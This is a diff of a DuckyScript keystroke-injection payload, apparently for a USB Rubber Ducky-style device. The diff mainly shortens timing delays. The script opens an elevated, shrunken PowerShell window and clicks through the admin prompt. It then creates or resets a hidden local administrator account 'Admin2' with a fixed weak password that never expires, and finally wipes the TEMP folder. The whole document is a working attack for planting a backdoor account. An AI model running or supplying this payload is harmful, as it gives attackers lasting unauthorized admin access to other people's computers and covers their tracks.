@@ -7,70 +7,74 @@ REM Props: Darren Kitchen, and I am Jakoby
 REM Version: 2.0
 REM Category: Execution
 
+REM Payload deployed, and completed in 36.12 sec. at current settings....
+
+
+DELAY 200
 GUI r
-DELAY 500
+DELAY 200
 STRING powershell -Command "Start-Process PowerShell -Verb RunAs"  
 DELAY 500
 ENTER
 DELAY 500
 ALT y
-DELAY 1000
+DELAY 500
 STRING PowerShell.exe -noe -c ". mode.com con: lines=5 cols=12"
-DELAY 1000
+DELAY 500
 ENTER
-DELAY 1000
+DELAY 500
 STRING $Username = "Admin2"
-DELAY 1000
+DELAY 500
 ENTER
 STRING $Password = "password"
-DELAY 1000
+DELAY 500
 ENTER
 STRING $group = "Administrators"
-DELAY 1000
+DELAY 500
 ENTER
 STRING $adsi = [ADSI]"WinNT://$env:COMPUTERNAME"
-DELAY 1000
+DELAY 500
 ENTER
 STRING $existing = $adsi.Children | where {$_.SchemaClassName -eq 'user' -and $_.Name -eq $Username }
-DELAY 1000
+DELAY 500
 ENTER
 STRING if ($existing -eq $null) {
-DELAY 1000
+DELAY 500
 ENTER
 STRING Write-Host "Creating new local user $Username."
-DELAY 1000
+DELAY 500
 ENTER
 STRING & NET USER $Username $Password /add /y /expires:never
-DELAY 1000  
+DELAY 500  
 ENTER 
 STRING Write-Host "Adding local user $Username to $group."
-DELAY 1000
+DELAY 500
 ENTER
 STRING & NET LOCALGROUP $group $Username /add
-DELAY 1000
+DELAY 500
 ENTER
 STRING }
-DELAY 1000
+DELAY 500
 ENTER
 STRING      {
-DELAY 1000
+DELAY 500
 ENTER
 STRING Write-Host "Setting password for existing local user $Username."
-DELAY 1000
+DELAY 500
 ENTER
 STRING $existing.SetPassword($Password)
-DELAY 1000
+DELAY 500
 ENTER
 STRING }
-DELAY 1000
+DELAY 500
 ENTER
 STRING Write-Host "Ensuring password for $Username never expires."
-DELAY 1000
+DELAY 500
 ENTER
 STRING & WMIC USERACCOUNT WHERE "Name='$Username'" SET PasswordExpires=FALSE
-DELAY 1000
+DELAY 500
 ENTER
-DELAY 1000
+DELAY 500
 STRING rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
 DELAY 500
 ENTER
